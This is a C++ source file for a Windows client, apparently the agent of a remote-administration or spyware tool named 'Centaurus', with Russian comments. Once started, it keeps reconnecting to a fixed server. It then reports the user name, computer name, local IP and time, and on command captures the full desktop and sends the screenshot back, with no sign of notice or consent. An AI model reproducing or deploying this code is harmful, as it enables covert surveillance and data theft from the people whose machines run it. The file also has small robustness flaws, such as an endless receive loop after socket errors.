#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include "Client.h"
#include <iostream>
#include <windows.h>
#include <Lmcons.h>
#include <sstream>
#include <thread>

#include "Constants.h"

#pragma comment(lib, "ws2_32.lib")

Client::Client(const char* serverIP_, u_short port_) : m_serverIP(serverIP_), m_port(port_) {
    WSADATA wsData;
    WORD DLLVersion = MAKEWORD(2, 1);
    if (WSAStartup(DLLVersion, &wsData) != 0)
    {
        std::cerr << "Error initializing Winsock" << std::endl;
        stop();
    }

    m_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (m_socket == INVALID_SOCKET)
    {
        std::cerr << "Can't create a socket! Quitting" << std::endl;
        stop();
    }

    SOCKADDR_IN addr;
    addr.sin_addr.s_addr = inet_addr(serverIP_);
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port_);

    while(true)
    {
        int connResult = connect(m_socket, (sockaddr*)&addr, sizeof(addr));
        if (connResult == SOCKET_ERROR) {
            std::cerr << "Can't connect to server!" << std::endl;
            Sleep(1000); 
            continue; 
        }
        break; 
    }

    // int connResult = connect(m_socket, (sockaddr*)&addr, sizeof(addr));
    // if (connResult == SOCKET_ERROR)
    // {
    //     std::cerr << "Can't connect to server! Quitting" << std::endl;
    //     stop();
    // }
}

Client::~Client() {
    closesocket(m_socket);
    WSACleanup();
}

/**
 * Начало сеанса.
 */
void Client::start() {
    sendClientInfo();
    std::thread commandThread(&Client::listenForCommands, this);
    commandThread.join();
}

/**
 * Завершение сеанса.
 */
void Client::stop() const {
    closesocket(m_socket);
    WSACleanup();
}

/**
 * Получить IPv4 адрес.
 * @return Строка с IPv4 адресом текущего клиента, в случае успеха.
 */
std::string getLocalIPv4() {
    char hostname[256];
    if (gethostname(hostname, sizeof(hostname)) != 0)
    {
        std::cerr << "gethostname failed" << std::endl;
        return "";
    }

    hostent* host = gethostbyname(hostname);
    if (host == nullptr)
    {
        std::cerr << "gethostbyname failed" << std::endl;
        return "";
    }

    for (char** addr = host->h_addr_list; *addr != nullptr; ++addr)
    {
        struct in_addr* ipv4 = reinterpret_cast<struct in_addr*>(*addr);
        if (ipv4)
        {
            return inet_ntoa(*ipv4);
        }
    }

    return "";
}

void Client::sendData(SOCKET sock, const std::string& str) {
    int strSize = static_cast<int>(str.size());
    
    // Сначала отправляем размер строки
    int sizeSent = send(sock, reinterpret_cast<const char*>(&strSize), sizeof(strSize), 0);
    if (sizeSent == SOCKET_ERROR) {
        std::cerr << "Failed to send string size, error: " << WSAGetLastError() << std::endl;
        return;
    }

    // Затем отправляем саму строку
    int totalBytesSent = 0;
    while (totalBytesSent < strSize) {
        int bytesSent = send(sock, str.data() + totalBytesSent, strSize - totalBytesSent, 0);
        if (bytesSent == SOCKET_ERROR) {
            std::cerr << "Failed to send string data, error: " << WSAGetLastError() << std::endl;
            break;
        }
        totalBytesSent += bytesSent;
    }
}

void Client::sendData(SOCKET sock, const std::vector<char>& data) {
    int dataSize = static_cast<int>(data.size());

    // Отправляем размер данных
    int sizeSent = send(sock, reinterpret_cast<const char*>(&dataSize), sizeof(dataSize), 0);
    if (sizeSent == SOCKET_ERROR) {
        std::cerr << "Failed to send data size, error: " << WSAGetLastError() << std::endl;
        return;
    }

    // Отправляем сами данные
    int totalBytesSent = 0;
    while (totalBytesSent < dataSize) {
        int bytesSent = send(sock, data.data() + totalBytesSent, dataSize - totalBytesSent, 0);
        if (bytesSent == SOCKET_ERROR) {
            std::cerr << "Failed to send data, error: " << WSAGetLastError() << std::endl;
            break;
        }
        totalBytesSent += bytesSent;
    }
}


/**
 * Отправить основную информацию о текущем клиенте.
 */
void Client::sendClientInfo() const
{
    auto now = std::chrono::system_clock::now();
    std::time_t currentTime = std::chrono::system_clock::to_time_t(now);
    std::stringstream timeStream;
    timeStream << std::put_time(std::localtime(&currentTime), "%d-%m-%Y %H:%M:%S");

    char username[UNLEN + 1];
    DWORD username_len = UNLEN + 1;
    GetUserNameA(username, &username_len);

    char computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD computerName_len = MAX_COMPUTERNAME_LENGTH + 1;
    GetComputerNameA(computerName, &computerName_len);

    std::string ipAddress = getLocalIPv4(); // Используем IP-адрес сервера для упрощения

    sendData(m_socket, Centaurus::cmd::connect);
    std::string timeStr = timeStream.str();
    sendData(m_socket, timeStr);
    sendData(m_socket, username);
    sendData(m_socket, computerName);
    sendData(m_socket, ipAddress);
}

/**
 * Обработка снимка экрана и запись в файл (*bmp).
 */
std::vector<BYTE> Client::captureScreenshot() {
    BITMAPFILEHEADER bfHeader;
    BITMAPINFOHEADER biHeader;
    BITMAPINFO bInfo;
    HGDIOBJ hTempBitmap;
    HBITMAP hBitmap;
    BITMAP bAllDesktops;
    HDC hDC, hMemDC;
    LONG lWidth, lHeight;
    BYTE* bBits = NULL;
    DWORD cbBits;
    INT x = GetSystemMetrics(SM_XVIRTUALSCREEN);
    INT y = GetSystemMetrics(SM_YVIRTUALSCREEN);

    ZeroMemory(&bfHeader, sizeof(BITMAPFILEHEADER));
    ZeroMemory(&biHeader, sizeof(BITMAPINFOHEADER));
    ZeroMemory(&bInfo, sizeof(BITMAPINFO));
    ZeroMemory(&bAllDesktops, sizeof(BITMAP));

    hDC = GetDC(NULL);
    hTempBitmap = GetCurrentObject(hDC, OBJ_BITMAP);
    GetObjectW(hTempBitmap, sizeof(BITMAP), &bAllDesktops);

    lWidth = bAllDesktops.bmWidth;
    lHeight = bAllDesktops.bmHeight;

    DeleteObject(hTempBitmap);

    bfHeader.bfType = (WORD)('B' | ('M' << 8));
    bfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    biHeader.biSize = sizeof(BITMAPINFOHEADER);
    biHeader.biBitCount = 24; // 24 бита на пиксель
    biHeader.biCompression = BI_RGB; // Без сжатия
    biHeader.biPlanes = 1;
    biHeader.biWidth = lWidth;
    biHeader.biHeight = lHeight;

    bInfo.bmiHeader = biHeader;

    cbBits = (((24 * lWidth + 31) & ~31) / 8) * lHeight;

    hMemDC = CreateCompatibleDC(hDC);
    hBitmap = CreateDIBSection(hDC, &bInfo, DIB_RGB_COLORS, (VOID**)&bBits, NULL, 0);
    SelectObject(hMemDC, hBitmap);

    BitBlt(hMemDC, 0, 0, lWidth, lHeight, hDC, x, y, SRCCOPY);

    std::vector<BYTE> imageData(sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + cbBits);
    memcpy(imageData.data(), &bfHeader, sizeof(BITMAPFILEHEADER));
    memcpy(imageData.data() + sizeof(BITMAPFILEHEADER), &biHeader, sizeof(BITMAPINFOHEADER));
    memcpy(imageData.data() + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER), bBits, cbBits);

    DeleteDC(hMemDC);
    ReleaseDC(NULL, hDC);
    DeleteObject(hBitmap);

    return imageData;
}



/**
 * Обработка и отправка на сервер снимка экрана.
 */
void Client::sendScreenshot(SOCKET sock) {
    std::vector<BYTE> screenshotData = captureScreenshot();

    sendData(sock, Centaurus::cmd::screenshot);
    
    int totalBytesSent = 0;
    int dataSize = static_cast<int>(screenshotData.size());
    
    int sizeSent = send(sock, reinterpret_cast<char*>(&dataSize), sizeof(dataSize), 0);
    if (sizeSent == SOCKET_ERROR) {
        std::cerr << "Failed to send data size, error: " << WSAGetLastError() << std::endl;
        return;
    }

    while (totalBytesSent < dataSize) {
        int bytesSent = send(sock, reinterpret_cast<char*>(screenshotData.data()) + totalBytesSent, dataSize - totalBytesSent, 0);
        if (bytesSent == SOCKET_ERROR) {
            std::cerr << "Failed to send screenshot data, error: " << WSAGetLastError() << std::endl;
            break;
        }
        totalBytesSent += bytesSent;
    }
}

/**
 * Обработка ответа сервера.
 */
void Client::listenForCommands() const
{
    char buf[4096];
    while (true)
    {
        ZeroMemory(buf, 4096);
        int bytesReceived = recv(m_socket, buf, 4096, 0);
        if (bytesReceived != SOCKET_ERROR)
        {
            std::string command(buf, 0, bytesReceived);
            if (command == Centaurus::cmd::screenshot)
            {
                std::cout << "Received screenshot command" << std::endl;
                sendScreenshot(m_socket);
            }
            else if (command == "/exit")
            {
                std::cout << "Server is shutting down" << std::endl;
            }
        }
    }
}
